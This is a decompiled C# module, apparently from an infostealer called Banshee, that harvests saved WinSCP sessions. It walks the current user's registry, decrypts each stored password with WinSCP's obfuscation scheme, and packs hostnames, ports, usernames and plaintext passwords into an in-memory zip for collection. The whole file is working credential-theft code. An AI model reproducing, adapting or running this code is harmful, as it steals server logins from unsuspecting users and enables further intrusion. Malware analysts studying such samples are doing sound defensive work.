﻿using System;
using System.Collections.Generic;
using System.Linq;
using Banshee.Helper.Data;
using Microsoft.Win32;

namespace Banshee.Targets.Applications
{
	// Token: 0x020000A7 RID: 167
	public class WinSCP : ITarget
	{
		// Token: 0x060001ED RID: 493 RVA: 0x00010884 File Offset: 0x00010884
		public void Collect(InMemoryZip zip, Counter counter)
		{
			List<string> list = new List<string>();
			List<string> list2 = new List<string>();
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Martin Prikryl\\WinSCP 2\\Sessions"))
				{
					if (registryKey == null)
					{
						return;
					}
					foreach (string text in registryKey.GetSubKeyNames())
					{
						string text2 = "Software\\Martin Prikryl\\WinSCP 2\\Sessions\\" + text;
						using (RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey(text2))
						{
							if (registryKey2 != null)
							{
								object value = registryKey2.GetValue("HostName");
								string text3 = (value != null) ? value.ToString() : null;
								if (!string.IsNullOrWhiteSpace(text3))
								{
									object value2 = registryKey2.GetValue("UserName");
									string text4 = (value2 != null) ? value2.ToString() : null;
									object value3 = registryKey2.GetValue("Password");
									string pass = (value3 != null) ? value3.ToString() : null;
									string text5 = WinSCP.DecryptPassword(text4, pass, text3);
									object value4 = registryKey2.GetValue("PortNumber");
									string text6 = (value4 != null) ? value4.ToString() : null;
									list.Add(string.Concat(new string[]
									{
										"Session: ",
										text,
										"\nUrl: ",
										text3,
										":",
										text6,
										"\nUsername: ",
										text4,
										"\nPassword: ",
										text5
									}));
									list2.Add("HKEY_CURRENT_USER\\" + text2);
								}
							}
						}
					}
				}
			}
			catch
			{
			}
			if (list.Count <= 0)
			{
				return;
			}
			string text7 = "WinScp\\Sessions.txt";
			zip.AddTextFile(text7, string.Join("\n\n", list));
			Counter.CounterApplications counterApplications = new Counter.CounterApplications();
			counterApplications.Name = "WinSCP";
			foreach (string str in list2)
			{
				counterApplications.Files.Add(str + " => " + text7);
			}
			counterApplications.Files.Add(text7);
			counter.Applications.Add(counterApplications);
		}

		// Token: 0x060001EE RID: 494 RVA: 0x00010B00 File Offset: 0x00010B00
		private static int DecryptNextChar(List<string> charList)
		{
			return 255 ^ (((int.Parse(charList[0]) << 4) + int.Parse(charList[1]) ^ 163) & 255);
		}

		// Token: 0x060001EF RID: 495 RVA: 0x00010B30 File Offset: 0x00010B30
		private static string DecryptPassword(string user, string pass, string host)
		{
			if (string.IsNullOrEmpty(user) || string.IsNullOrEmpty(pass) || string.IsNullOrEmpty(host))
			{
				return "";
			}
			string result;
			try
			{
				List<string> list = (from c in pass
				select c.ToString()).ToList<string>();
				List<string> list2 = new List<string>();
				foreach (string text in list)
				{
					if (!(text == "A"))
					{
						if (!(text == "B"))
						{
							if (!(text == "C"))
							{
								if (!(text == "D"))
								{
									if (!(text == "E"))
									{
										if (!(text == "F"))
										{
											list2.Add(text);
										}
										else
										{
											list2.Add("15");
										}
									}
									else
									{
										list2.Add("14");
									}
								}
								else
								{
									list2.Add("13");
								}
							}
							else
							{
								list2.Add("12");
							}
						}
						else
						{
							list2.Add("11");
						}
					}
					else
					{
						list2.Add("10");
					}
				}
				if (WinSCP.DecryptNextChar(list2) == 255)
				{
					WinSCP.DecryptNextChar(list2);
				}
				list2.RemoveRange(0, 4);
				int num = WinSCP.DecryptNextChar(list2);
				list2.RemoveRange(0, 2);
				int count = WinSCP.DecryptNextChar(list2) * 2;
				list2.RemoveRange(0, count);
				string text2 = "";
				for (int i = 0; i < num; i++)
				{
					text2 += ((char)WinSCP.DecryptNextChar(list2)).ToString();
					list2.RemoveRange(0, 2);
				}
				string oldValue = user + host;
				result = text2.Replace(oldValue, "");
			}
			catch
			{
				result = "";
			}
			return result;
		}
	}
}
